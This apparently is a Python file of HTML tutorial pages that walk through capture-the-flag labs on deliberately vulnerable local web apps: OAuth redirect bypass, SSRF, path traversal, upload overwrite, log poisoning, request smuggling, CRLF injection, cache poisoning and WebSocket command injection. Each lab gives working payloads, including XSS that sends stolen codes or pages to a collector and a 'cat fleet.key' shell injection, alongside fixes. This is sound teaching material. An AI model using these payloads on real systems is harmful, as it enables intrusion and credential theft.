+<h2 id="lab-24-oauth-redirect-validation-as-a-string-bug">Lab 24: OAuth redirect validation as a string bug</h2>
+<p>Start the SSO lab:</p>
+<pre><code class="language-bash">$ ./run.sh 24
+$ h5i browser open 'http://127.0.0.1:9240/' \
+  --session lab24 --new --capture
+</code></pre>
+<p>The <code>notes</code> client has one registered callback:</p>
+<pre><code class="language-text">http://127.0.0.1:9240/callback
+</code></pre>
+<p>The authorization server incorrectly checks only whether that text appears somewhere inside the supplied <code>redirect_uri</code>.</p>
+<p>Create an attacker callback where the registered URL appears inside a query parameter:</p>
+<pre><code class="language-text">http://127.0.0.1:9241/p/callback?next=http://127.0.0.1:9240/callback
+</code></pre>
+<p>URL-encode it and construct the authorization URL:</p>
+<pre><code class="language-bash">$ EVIL='http://127.0.0.1:9241/p/callback?next=http://127.0.0.1:9240/callback'
+$ ENCODED=$(python3 -c \
+  'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1],safe=&quot;&quot;))' &quot;$EVIL&quot;)
+$ AUTH=&quot;http://127.0.0.1:9240/oauth/authorize?client_id=notes&amp;state=xyz&amp;redirect_uri=$ENCODED&quot;
+</code></pre>
+<p>Publish a callback page that records <code>location.search</code>, then send <code>$AUTH</code> to the signed-in victim through <code>/report</code>. The victim is redirected to the attacker page with an authorization code.</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAGE=&quot;&lt;script&gt;fetch('http://127.0.0.1:9240/collect?id=$ID&amp;c='+encodeURIComponent(location.search))&lt;/script&gt;&quot;
+
+$ h5i websec replay req_0 --session lab24 --create \
+  --set method=POST --set path=/page \
+  --set header.Content-Type=application/json \
+  --set json.name=callback --set &quot;json.html=$PAGE&quot;
+
+$ h5i websec replay req_0 --session lab24 --create \
+  --set method=POST --set path=/report \
+  --set header.Content-Type=application/json \
+  --set &quot;json.url=$AUTH&quot;
+</code></pre>
+<p>Read the collector, extract the <code>code</code> parameter, and exchange it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab24 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The row looks like <code>?next=http://127.0.0.1:9240/callback&amp;code=&lt;hex&gt;&amp;state=xyz</code>.</p>
+<pre><code class="language-bash">$ CODE='PASTE_AUTHORIZATION_CODE'
+$ h5i websec replay req_0 --session lab24 --create \
+  --set method=POST --set path=/oauth/token \
+  --set header.Content-Type=application/json \
+  --set &quot;json.code=$CODE&quot;
+$ TOKEN='PASTE_ACCESS_TOKEN'
+</code></pre>
+<p>Call <code>/api/profile</code> with the access token:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab24 --create \
+  --set path=/api/profile \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot;
+</code></pre>
+<p>The profile contains <code>FLAG{oauth_redirect_uri}</code>.</p>
+<p>OAuth redirect URIs should be matched exactly after careful parsing. A registered URL appearing as a substring, subdomain, path fragment, or query value is not the registered destination.</p>
+<h2 id="the-shared-browser-security-model">The shared browser-security model</h2>
+<p>These labs used different standards, but the testing questions repeat:</p>
+<ol>
+<li>Can attacker-controlled text become executable HTML or JavaScript?</li>
+<li>If a cookie cannot be read, can the browser still act with it?</li>
+<li>Does a cross-origin check compare scheme, host, and port?</li>
+<li>Does a redirect rule validate a destination or merely search a string?</li>
+<li>What protected response can the victim’s browser read and send elsewhere?</li>
+</ol>
+<h2 id="summary">Summary</h2>
+<p>Reflected and stored XSS gave code the victim’s origin. CSRF used the victim’s cookie without reading it. A partial CORS check exposed a credentialed response, and substring validation redirected an OAuth code to the wrong origin.</p>
+<pre><code class="language-bash">$ for s in lab20 lab21 lab22 lab23 lab24; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/ssrf-and-file-attacks/">SSRF and File Attacks</a>, we will make the server itself the client and combine SSRF, path traversal, uploads, and local file inclusion.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/20-reflected-xss-filter">Lab 20: Reflected XSS</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/21-stored-xss-httponly">Lab 21: Stored XSS</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/22-csrf-no-token">Lab 22: CSRF</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/23-cors-origin-check">Lab 23: CORS</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/24-oauth-redirect-uri">Lab 24: OAuth redirect URI</a></li>
+</ul>""",
+}
+
+
+SSRF = {
+    "section": "guides", "slug": "ssrf-and-file-attacks", "published": "2026-09-13",
+    "eyebrow": "Tutorial 07 / Server-side", "time": "6 min",
+    "tags": "SSRF &middot; Traversal &middot; LFI &middot; Labs 25&ndash;29",
+    "title": "SSRF and File Attacks | h5i web security tutorial",
+    "h1": "SSRF and File Attacks",
+    "description": "A beginner-friendly CTF tutorial: make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.",
+    "meta": "Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.",
+    "deck": "A beginner-friendly CTF tutorial: make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.",
+    "next": ("/guides/http-protocol-attacks/", "Next in the series", "HTTP Protocol Attacks", "Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>In <a href="/guides/browser-as-a-weapon/">The Browser as a Weapon</a>, we used a victim’s browser to send authenticated requests. Labs 25–29 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> ask a related question:</p>
+<blockquote>
+<p>What can the application server reach, read, or write that we cannot?</p>
+</blockquote>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to test server-side request forgery, path traversal, upload destinations, and local file inclusion. The targets run locally and are deliberately vulnerable.</p>
+<h2 id="lab-25-ssrf-to-an-internal-metadata-service">Lab 25: SSRF to an internal metadata service</h2>
+<p><strong>Server-side request forgery</strong>, or <strong>SSRF</strong>, occurs when an application fetches a URL supplied by a user. The request originates from the server, so it may reach internal services unavailable to an external visitor.</p>
+<p>Start the link-preview lab:</p>
+<pre><code class="language-bash">$ ./run.sh 25
+$ h5i browser open \
+  'http://127.0.0.1:9250/api/preview?url=http://127.0.0.1:9251/' \
+  --session lab25 --new --capture --allow 127.0.0.1
+</code></pre>
+<p>Port 9251 represents a cloud instance-metadata service. Walk its path:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab25 \
+  --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/
+
+$ h5i websec replay req_0 --session lab25 \
+  --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/linkpreview-role
+</code></pre>
+<p>The second response contains <code>FLAG{ssrf_metadata}</code>.</p>
+<p>The vulnerable application treats a user URL as a safe fetch destination. A defense must parse and resolve the hostname, reject private, loopback, link-local, and otherwise prohibited addresses, and connect to the exact checked IP. Redirects must be checked again.</p>
+<h2 id="lab-26-one-address-several-spellings">Lab 26: one address, several spellings</h2>
+<p>The next lab blocks strings including <code>localhost</code> and <code>127.0.0.1</code>:</p>
+<pre><code class="language-bash">$ ./run.sh 26
+$ h5i browser open 'http://127.0.0.1:9260/' \
+  --session lab26 --new --capture
+</code></pre>
+<p>The resolver accepts other textual forms of the same loopback address. For example, <code>2130706433</code> is the integer representation of <code>127.0.0.1</code>.</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab26 --create \
+  --set path=/api/test \
+  --set query.url=http://2130706433:9261/ops/credentials
+</code></pre>
+<p>The internal service returns <code>FLAG{ssrf_filter_bypass}</code>.</p>
+<p>Other parsers may accept shortened, octal, hexadecimal, or IPv6 forms. Maintaining a blocklist of spellings is therefore insufficient.</p>
+<p>The safe sequence is:</p>
+<ol>
+<li>parse the URL;</li>
+<li>resolve its hostname;</li>
+<li>check every resolved address against the network policy;</li>
+<li>connect to the checked address without resolving it again; and</li>
+<li>repeat the process after every redirect.</li>
+</ol>
+<p>This also prevents DNS rebinding, where a hostname resolves to an allowed address during validation and an internal address during connection.</p>
+<h2 id="lab-27-encoded-path-traversal">Lab 27: encoded path traversal</h2>
+<p>Start the document viewer:</p>
+<pre><code class="language-bash">$ ./run.sh 27
+$ h5i browser open \
+  'http://127.0.0.1:9270/download?file=welcome.md' \
+  --session lab27 --new --capture
+</code></pre>
+<p>The application strips <code>../</code>, but decoding happens in multiple layers. Double-encode the traversal:</p>
+<pre><code class="language-bash">$ UP='%252e%252e%252f'
+</code></pre>
+<p>A normal URL library may parse and reserialize the value before sending it. First record that behavior:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab27 \
+  --set &quot;query.file=${UP}secret%252fflag.txt&quot;
+</code></pre>
+<p>Now place the exact bytes on the HTTP request line:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab27 \
+  --raw-target &quot;/download?file=${UP}secret%252fflag.txt&quot;
+</code></pre>
+<p>The response contains <code>FLAG{path_traversal_encoded}</code>.</p>
+<p><code>--raw-target</code> matters when the representation itself is the payload. It bypasses normal URL parsing for the request target while keeping the request in h5i’s policy and audit trail.</p>
+<p>The server should decode once into a canonical form, resolve the path, and verify that the final path remains inside the permitted directory. Repeated string replacement is not path containment.</p>
+<h2 id="lab-28-upload-outside-the-upload-directory">Lab 28: upload outside the upload directory</h2>
+<p>The avatar service checks that uploaded bytes start with the JPEG magic number, but trusts the supplied filename.</p>
+<pre><code class="language-bash">$ ./run.sh 28
+$ h5i browser open 'http://127.0.0.1:9280/' \
+  --session lab28 --new --capture
+$ WORK=$(mktemp -d)
+$ KEY=&quot;k-pwn-$$&quot;
+</code></pre>
+<p>Create a file that begins like a JPEG and then contains a key the application will parse:</p>
+<pre><code class="language-bash">$ python3 - &quot;$WORK/poly.jpg&quot; &quot;$KEY&quot; &lt;&lt;'PY'
+import sys
+
+data = b&quot;\xff\xd8\xff\xe0&quot; + f&quot;\n{sys.argv[2]}\n&quot;.encode()
+open(sys.argv[1], &quot;wb&quot;).write(data)
+PY
+</code></pre>
+<p>Upload it with a filename that escapes into the configuration directory:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab28 --create \
+  --set method=POST --set path=/api/avatar \
+  --set-file &quot;multipart.file=$WORK/poly.jpg&quot; \
+  --set multipart.file.filename=../config/trusted_keys.txt \
+  --set multipart.file.content_type=image/jpeg
+</code></pre>
+<p>The application re-reads that file when checking admin keys. Supply ours:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab28 --create \
+  --set path=/api/admin/flag \
+  --set &quot;header.X-Api-Key=$KEY&quot;
+</code></pre>
+<p>The result contains <code>FLAG{upload_path_write}</code>.</p>
+<p>Validating file contents answered “Is this a JPEG?” It never answered “Where may this file be written?” Generate storage names server-side, resolve the destination, enforce containment, and keep uploads away from code and configuration.</p>
+<h2 id="lab-29-lfi-log-poisoning-and-template-execution">Lab 29: LFI, log poisoning, and template execution</h2>
+<p>Start the wiki:</p>
+<pre><code class="language-bash">$ ./run.sh 29
+$ h5i browser open \
+  'http://127.0.0.1:9290/view?page=home.md' \
+  --session lab29 --new --capture
+</code></pre>
+<p>Request a missing page. Its error reveals that <code>access.log</code> sits next to the page directory:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
+  --set query.page=nope
+</code></pre>
+<p>Every request writes its <code>User-Agent</code> into that log. Put a template expression there:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
+  --set 'header.User-Agent={{page.__init__.__globals__[&quot;RELEASE_KEY&quot;]}}'
+</code></pre>
+<p>Finally, traverse from <code>pages/</code> to the log:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
+  --set query.page=../access.log
+</code></pre>
+<p>The wiki includes the log and renders it as a template. The expression executes and returns <code>FLAG{lfi_log_poisoning}</code>.</p>
+<p>No single input gave us a template upload. The chain combined:</p>
+<ol>
+<li><strong>local file inclusion</strong>, which reads a path outside the page directory;</li>
+<li><strong>log poisoning</strong>, which places controlled text into an existing file; and</li>
+<li><strong>server-side template injection</strong>, because included files are rendered.</li>
+</ol>
+<p>The fix must close each boundary: enforce path containment, encode or structure log fields, and never render arbitrary included files as templates.</p>
+<h2 id="a-reusable-server-and-file-testing-method">A reusable server-and-file testing method</h2>
+<p>For every server-side fetch, ask which networks and protocols the server can reach. For every file operation, separate three questions:</p>
+<ul>
+<li>Are the bytes allowed?</li>
+<li>Is the destination allowed?</li>
+<li>How will the file be interpreted later?</li>
+</ul>
+<p>Also confirm what actually reached the wire. Encoded traversal and protocol-level payloads frequently fail because the client normalized them before the server saw them.</p>
+<h2 id="summary">Summary</h2>
+<p>SSRF turned the server into an internal client. Alternative address notation bypassed a string filter. A raw encoded target survived normalization, an upload filename overwrote trusted configuration, and an access log became an executable template.</p>
+<pre><code class="language-bash">$ for s in lab25 lab26 lab27 lab28 lab29; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ rm -rf &quot;$WORK&quot;
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/http-protocol-attacks/">HTTP Protocol Attacks</a>, we will move below ordinary HTTP requests: desynchronization, injected headers, cache keys, and WebSocket frames.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/25-ssrf-metadata">Lab 25: SSRF to metadata</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/26-ssrf-filter-bypass">Lab 26: SSRF filter bypass</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/27-path-traversal-encoded">Lab 27: Encoded path traversal</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/28-upload-path-write">Lab 28: Upload path write</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/29-lfi-log-poisoning">Lab 29: LFI and log poisoning</a></li>
+</ul>""",
+}
+
+
+PROTOCOL = {
+    "section": "guides", "slug": "http-protocol-attacks", "published": "2026-09-15",
+    "eyebrow": "Tutorial 08 / Protocol", "time": "7 min",
+    "tags": "Smuggling &middot; CRLF &middot; Cache poisoning &middot; Labs 30&ndash;34",
+    "title": "HTTP Protocol Attacks | h5i web security tutorial",
+    "h1": "HTTP Protocol Attacks",
+    "description": "A beginner-friendly CTF tutorial: control raw request framing, inject headers, poison shared caches, and test commands carried over WebSockets.",
+    "meta": "Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets.",
+    "deck": "A beginner-friendly CTF tutorial: control raw request framing, inject headers, poison shared caches, and test commands carried over WebSockets.",
+    "next": ("/guides/logic-time-and-crypto/", "Next in the series", "Business Logic, Time, and Crypto", "Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>Most earlier labs changed a parameter inside an ordinary HTTP request. Labs 30–34 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> focus on the layers around it: where a request ends, how headers are constructed, which inputs define a cache entry, and what happens after a page upgrades to a WebSocket.</p>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to send exact request bytes and WebSocket frames while keeping them inside the same policy and audit trail.</p>
+<p>These techniques can affect other users’ traffic. Use only the included local labs or systems where the rules of engagement explicitly permit them.</p>
+<h2 id="lab-30-http-request-smuggling">Lab 30: HTTP request smuggling</h2>
+<p>A reverse proxy and an application server must agree on where one request ends. If one uses <code>Content-Length</code> while the other uses <code>Transfer-Encoding</code>, the same bytes can describe different message boundaries.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 30
+$ h5i browser open 'http://127.0.0.1:9300/health' \
+  --session lab30 --new --capture
+$ WORK=$(mktemp -d)
+</code></pre>
+<p>The edge blocks <code>/admin/*</code>. We will make it see one permitted <code>POST</code>, while the backend sees the end of that request followed by a second request to <code>/admin/flag</code>.</p>
+<p>Create the exact wire message:</p>
+<pre><code class="language-bash">$ python3 - 'http://127.0.0.1:9300' &quot;$WORK/desync.http&quot; &lt;&lt;'PY'
+import sys
+from urllib.parse import urlparse
+
+host = urlparse(sys.argv[1]).netloc
+smuggled = (
+    f&quot;GET /admin/flag HTTP/1.1\r\n&quot;
+    f&quot;Host: {host}\r\n\r\n&quot;
+)
+body = &quot;0\r\n\r\n&quot; + smuggled
+
+outer = (
+    f&quot;POST / HTTP/1.1\r\n&quot;
+    f&quot;Host: {host}\r\n&quot;
+    f&quot;Content-Type: text/plain\r\n&quot;
+    f&quot;Content-Length: {len(body)}\r\n&quot;
+    f&quot;Transfer-Encoding: chunked\r\n&quot;
+    f&quot;\r\n&quot;
+    f&quot;{body}&quot;
+)
+
+open(sys.argv[2], &quot;wb&quot;).write(outer.encode())
+PY
+</code></pre>
+<p>Send the file without reconstructing its framing:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab30 \
+  --raw-request &quot;$WORK/desync.http&quot;
+</code></pre>
+<p>The summary reports only the first response, <code>{"seen": "POST /"}</code>, because that is the one the proxy considers the answer to our request. Both responses arrived on the same connection, so read the stored message to see the second one. Use the <code>seq</code> the replay printed:</p>
+<pre><code class="language-bash">$ h5i websec show res_1 --session lab30 --raw
+</code></pre>
+<p>Two HTTP responses appear back to back, and the second contains <code>FLAG{request_smuggling_clte}</code>. That second response is the whole finding: it is the answer to a request the edge never allowed and never saw.</p>
+<p>This is a CL.TE desynchronization: the proxy trusts <code>Content-Length</code>; the backend trusts chunked encoding. Prevent it by rejecting ambiguous requests, normalizing framing once, and avoiding unsafe reuse of backend connections.</p>
+<p><code>--raw-request</code> is deliberately different from ordinary replay. A normal HTTP client would recompute the very headers we need to test.</p>
+<h2 id="lab-31-crlf-header-injection">Lab 31: CRLF header injection</h2>
+<p>HTTP/1 headers are separated by carriage return and line feed bytes: CRLF, written <code>\r\n</code>. If an application inserts user input into a header without rejecting newlines, the value can end one header and begin another.</p>
+<p>Start the report lab:</p>
+<pre><code class="language-bash">$ ./run.sh 31
+$ h5i browser open 'http://127.0.0.1:9310/' \
+  --session lab31 --new --capture
+</code></pre>
+<p>The front end sends a report name to an internal service and appends <code>X-Role: guest</code>. Insert a new header and end the header block before the application’s own role:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab31 --create \
+  --set method=POST --set path=/api/report \
+  --set header.Content-Type=application/json \
+  --set &quot;json.name=quarterly&quot;$'\r\n'&quot;X-Role: admin&quot;$'\r\n\r\n'
+</code></pre>
+<p>The internal parser sees <code>X-Role: admin</code>; the later guest header falls into the body. The response contains <code>FLAG{crlf_header_injection}</code>.</p>
+<p>Reject CR and LF in values used to construct protocol headers. Prefer APIs that represent headers structurally and refuse invalid bytes rather than composing an HTTP message as text.</p>
+<h2 id="lab-32-host-header-password-reset-poisoning">Lab 32: Host-header password-reset poisoning</h2>
+<p>Applications often need to build an absolute password-reset URL. If the request’s <code>Host</code> header supplies the domain, an attacker can make the emailed link point somewhere else.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 32
+$ h5i browser open 'http://127.0.0.1:9320/' \
+  --session lab32 --new --capture --allow 127.0.0.1
+</code></pre>
+<p>Ask for an admin reset while changing the host to the lab’s collector:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab32 --create \
+  --set method=POST --set path=/api/reset \
+  --set header.Content-Type=application/json \
+  --set header.Host=127.0.0.1:9321 \
+  --set json.email=admin@acme.test
+</code></pre>
+<p>The simulated mailbox owner clicks the link, and the collector on port 9321 records the path it was sent to. Read it through the same session:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab32 --create \
+  --set url=http://127.0.0.1:9321/seen \
+  --set header.Host=127.0.0.1:9321
+</code></pre>
+<p>The body is <code>{"seen": ["/api/reset/use?token=&lt;hex&gt;", ...]}</code>. Extract that token and use it:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_RESET_TOKEN'
+$ h5i websec replay req_0 --session lab32 --create \
+  --set path=/api/reset/use \
+  --set &quot;query.token=$TOKEN&quot;
+</code></pre>
+<p>The response contains <code>FLAG{host_header_reset}</code>.</p>
+<p>Generate security-sensitive absolute URLs from trusted configuration, not <code>Host</code>, <code>X-Forwarded-Host</code>, or similar client-controlled headers. At the edge, allowlist accepted hostnames.</p>
+<h2 id="lab-33-poison-a-shared-cache">Lab 33: poison a shared cache</h2>
+<p>A cache key decides which requests share a stored response. A poisoning opportunity exists when an input changes the response but is absent from that key.</p>
+<p>Start the newsroom lab:</p>
+<pre><code class="language-bash">$ ./run.sh 33
+$ h5i browser open 'http://127.0.0.1:9330/' \
+  --session lab33 --new --capture
+$ ID=&quot;drop$$&quot;
+</code></pre>
+<p>The origin reflects <code>X-Forwarded-Host</code> into the homepage, but the cache keys only on the URL. Create an XSS payload:</p>
+<pre><code class="language-bash">$ PAYLOAD=&quot;x\&quot;&gt;&lt;script&gt;fetch('/admin/flag').then(r=&gt;r.text()).then(t=&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(t)))&lt;/script&gt;&lt;x y=\&quot;&quot;
+</code></pre>
+<p>A single attempt almost never wins. A cache hit never reaches the origin, so our response can only be stored during the moment the entry is expired. Keep repopulating it, and check the collector between rounds:</p>
+<pre><code class="language-bash">$ for _ in $(seq 1 40); do
+    h5i websec replay req_0 --session lab33 \
+      --reset-budget --repeat 5 \
+      --set path=/ \
+      --set &quot;header.X-Forwarded-Host=$PAYLOAD&quot; &gt;/dev/null
+
+    h5i websec replay req_0 --session lab33 --create \
+      --reset-budget \
+      --set path=/collected --set &quot;query.id=$ID&quot; |
+      grep -q 'FLAG' &amp;&amp; break
+
+    sleep 0.6
+  done
+
+$ h5i websec replay req_0 --session lab33 --create \
+  --reset-budget \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>When the attacker’s response becomes the cached <code>/</code> entry, the editor’s next reload receives and executes it, and the collector row contains <code>FLAG{cache_poisoning}</code>.</p>
+<p>Test caches by finding inputs that satisfy both conditions:</p>
+<ol>
+<li>changing the input changes the origin response;</li>
+<li>changing the input does not create a different cache entry.</li>
+</ol>
+<p>The cache and origin must agree on every response-varying input. Do not reflect forwarding headers without validation, and avoid caching personalized or executable responses.</p>
+<h2 id="lab-34-command-injection-over-a-websocket">Lab 34: command injection over a WebSocket</h2>
+<p>The visible page in Lab 34 is static. Its operations travel as JSON frames over a WebSocket, so an HTTP-only request history would miss the attack surface.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 34
+$ h5i browser open 'http://127.0.0.1:9340/' \
+  --session lab34 --new --capture --allow 127.0.0.1
+</code></pre>
+<p>Learn the frame format with a normal action:</p>
+<pre><code class="language-bash">$ h5i websec socket ws://127.0.0.1:9341/control \
+  --session lab34 \
+  --send '{&quot;action&quot;:&quot;status&quot;}'
+</code></pre>
+<p>The <code>ping</code> action interpolates its <code>host</code> field into a shell command. Add a second command:</p>
+<pre><code class="language-bash">$ h5i websec socket ws://127.0.0.1:9341/control \
+  --session lab34 \
+  --send '{&quot;action&quot;:&quot;ping&quot;,&quot;host&quot;:&quot;10.0.0.1; cat fleet.key&quot;}' \
+  --wait-ms 3000
+</code></pre>
+<p>The returned frame contains <code>FLAG{websocket_injection}</code>.</p>
+<p>WebSocket messages require the same authentication, authorization, schema validation, and injection defenses as HTTP endpoints. Use an argument array rather than a shell for <code>ping</code>, and validate the host as an IP address or hostname.</p>
+<h2 id="a-reusable-protocol-testing-method">A reusable protocol-testing method</h2>
+<p>Ask where two components may disagree:</p>
+<ul>
+<li>proxy versus backend request boundaries;</li>
+<li>application text versus header structure;</li>
+<li>origin response variation versus cache key;</li>
+<li>HTTP-visible pages versus WebSocket-only operations.</li>
+</ul>
+<p>When bytes are the experiment, verify the sent message itself. <code>--raw-request</code> and <code>--raw-target</code> exist because helpful normalization can otherwise erase the payload before it reaches the target.</p>
+<h2 id="summary">Summary</h2>
+<p>Labs 30–34 moved beneath normal parameters. We desynchronized two HTTP parsers, injected a header using CRLF, poisoned a reset link through <code>Host</code>, placed executable content in a shared cache, and carried command injection through a WebSocket frame.</p>
+<pre><code class="language-bash">$ for s in lab30 lab31 lab32 lab33 lab34; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ rm -rf &quot;$WORK&quot;
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/logic-time-and-crypto/">Business Logic, Time, and Crypto</a>, we will test the rules around money, time, randomness, authentication state, and serialized objects.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/30-request-smuggling-clte">Lab 30: Request smuggling</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/31-crlf-header-injection">Lab 31: CRLF injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/32-host-header-reset">Lab 32: Host-header reset poisoning</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/33-cache-poisoning">Lab 33: Cache poisoning</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/34-websocket-injection">Lab 34: WebSocket injection</a></li>
+</ul>""",
+}
+
+
+LOGIC = {
+    "section": "guides", "slug": "logic-time-and-crypto", "published": "2026-09-15",
+    "eyebrow": "Tutorial 09 / Logic", "time": "8 min",
+    "tags": "Races &middot; Predictable tokens &middot; MFA &middot; Labs 35&ndash;40",
+    "title": "Business Logic, Time, and Crypto | h5i web security tutorial",
+    "h1": "Business Logic, Time, and Crypto",
+    "description": "A beginner-friendly CTF tutorial: race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.",
+    "meta": "Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.",
+    "deck": "A beginner-friendly CTF tutorial: race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.",
+    "next": ("/guides/exploit-chains/", "Next in the series", "Building Exploit Chains", "Carry fresh values between requests, turn small findings into a complete compromise, and keep the whole chain reproducible."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>Many serious vulnerabilities contain no obviously dangerous character. Every request may be well-formed and every field may pass validation, while the application’s larger rule is still wrong.</p>
+<p>Labs 35–40 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> focus on those rules: ordering, concurrency, randomness, cryptographic constructions, authentication state, and serialization.</p>
+<p>The labs are local and deliberately vulnerable. Race tests and business-logic attacks can modify data, so use them only with explicit authorization.</p>
+<h2 id="lab-35-race-a-check-then-act-operation">Lab 35: race a check-then-act operation</h2>
+<p>Alice has 100 credits. The transfer endpoint reads the balance, waits briefly, and subtracts later. Multiple requests can therefore observe the same original balance before any one updates it.</p>
+<pre><code class="language-bash">$ ./run.sh 35
+$ h5i browser open 'http://127.0.0.1:9350/' \
+  --session lab35 --new --capture
+</code></pre>
+<p>The homepage prints Alice’s bearer token. Read it out of the captured response:</p>
+<pre><code class="language-bash">$ h5i websec show res_0 --session lab35 --raw
+</code></pre>
+<p>Copy the <code>tok_...</code> value, then release 25 transfers together:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_TOKEN'
+$ h5i websec replay req_0 --session lab35 --create \
+  --repeat 25 --race \
+  --set method=POST --set path=/api/transfer \
+  --set header.Content-Type=application/json \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot; \
+  --set json.to=vault --set json.amount=100
+</code></pre>
+<p><code>--repeat 25</code> creates the requests. <code>--race</code> makes their worker threads wait at a barrier and then send together.</p>
+<p>Several transfers pass the balance check using the same 100-credit snapshot. Request <code>/api/rewards</code> to obtain <code>FLAG{race_double_spend}</code>.</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab35 --create \
+  --set path=/api/rewards
+</code></pre>
+<p>The fix is an atomic database operation or transaction that locks the row, checks the balance, and updates it as one indivisible action. An idempotency key can also prevent the same logical operation from being accepted repeatedly.</p>
+<h2 id="lab-36-stack-individually-valid-coupons">Lab 36: stack individually valid coupons</h2>
+<p>The checkout API carefully validates every item and coupon. It forgets one business rule: the same coupon should apply only once.</p>
+<pre><code class="language-bash">$ ./run.sh 36
+$ h5i browser open 'http://127.0.0.1:9360/' \
+  --session lab36 --new --capture
+
+$ h5i websec replay req_0 --session lab36 --create \
+  --set method=POST --set path=/api/checkout \
+  --set header.Content-Type=application/json \
+  --set json.item=enterprise-license \
+  --set 'json.coupons=[&quot;FRIEND25&quot;,&quot;FRIEND25&quot;,&quot;FRIEND25&quot;,&quot;FRIEND25&quot;]'
+</code></pre>
+<p>Four valid 25% discounts reduce the price to zero and return <code>FLAG{coupon_stacking}</code>.</p>
